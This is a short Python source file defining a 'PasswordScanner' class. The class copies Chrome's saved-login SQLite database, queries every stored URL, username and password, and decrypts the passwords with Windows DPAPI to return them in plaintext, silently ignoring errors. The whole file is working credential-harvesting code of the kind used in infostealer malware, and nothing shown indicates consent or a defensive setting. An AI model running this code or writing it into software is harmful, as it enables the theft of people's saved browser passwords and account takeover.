import os
import sqlite3
import shutil
from utils.path_utils import get_chrome_password_db, is_windows
from utils.crypto_utils import decrypt_windows_dpapi

class PasswordScanner:
    """Scan for saved browser passwords"""
    
    def scan_chrome_passwords(self):
        """Extract saved passwords from Chrome"""
        passwords = []
        
        chrome_db = get_chrome_password_db()
        if not chrome_db or not os.path.exists(chrome_db):
            return passwords
        
        try:
            # Chrome locks the file, so we need to copy it first
            temp_db = "temp_chrome_login_data.db"
            shutil.copy(chrome_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                origin, username, encrypted_password = row
                
                # Try to decrypt password if on Windows
                if is_windows() and encrypted_password:
                    try:
                        decrypted = decrypt_windows_dpapi(encrypted_password)
                        passwords.append({
                            "url": origin,
                            "username": username,
                            "password": decrypted
                        })
                    except:
                        passwords.append({
                            "url": origin,
                            "username": username,
                            "password": "[ENCRYPTED]"
                        })
                else:
                    passwords.append({
                        "url": origin,
                        "username": username,
                        "password": "[UNABLE_TO_DECRYPT]"
                    })
            
            conn.close()
            os.remove(temp_db)
        
        except Exception as e:
            pass
        
        return passwords
